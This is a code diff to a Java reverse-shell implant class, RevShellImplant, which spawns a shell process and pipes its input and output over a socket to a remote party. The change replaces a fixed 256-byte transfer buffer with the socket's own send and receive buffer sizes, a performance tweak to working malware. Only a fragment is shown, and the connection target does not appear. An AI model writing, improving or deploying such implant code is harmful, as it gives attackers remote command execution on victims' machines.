@@ -120,7 +120,7 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
                 log("[$] Shell '" + shellCommandExecStr + "' popped with PID " + shell.pid() + ".");
 
                 Thread pipe1 = new Thread(() -> {
-                    transfer(fromShell, toRemote);
+                    transfer(fromShell, toRemote, getSendBufferSize(connection));
                     log("[-] Shell terminated.");
                     closeAll(connection);
                     shell.destroy();
@@ -128,7 +128,7 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
                 pipe1.start();
 
                 Thread pipe2 = new Thread(() -> {
-                    transfer(fromRemote, toShell);
+                    transfer(fromRemote, toShell, getRecvBufferSize(connection));
                     log("[-] Connection terminated.");
                     closeAll(connection);
                     shell.destroy();
@@ -189,16 +189,33 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
         }
     }
 
+    private static int getSendBufferSize(Socket socket) {
+        try {
+            return socket.getSendBufferSize();
+        } catch (SocketException e) {
+            return 65536;
+        }
+    }
+
+    private static int getRecvBufferSize(Socket socket) {
+        try {
+            return socket.getReceiveBufferSize();
+        } catch (SocketException e) {
+            return 65536;
+        }
+    }
+
     /**
      * Transfer all data from one stream to another.
      * No string/text interpretation will be done. Just raw bytes.
      * This method blocks and returns only if the streams are closed, or the current thread is interrupted.
      *
-     * @param input  from
-     * @param output to
+     * @param input      from
+     * @param output     to
+     * @param bufferSize size of the read buffer
      */
-    private static void transfer(InputStream input, OutputStream output) {
-        byte[] buffer = new byte[256];
+    private static void transfer(InputStream input, OutputStream output, int bufferSize) {
+        byte[] buffer = new byte[bufferSize];
         while (!Thread.interrupted()) {
             try {
                 int readAmount = input.read(buffer);
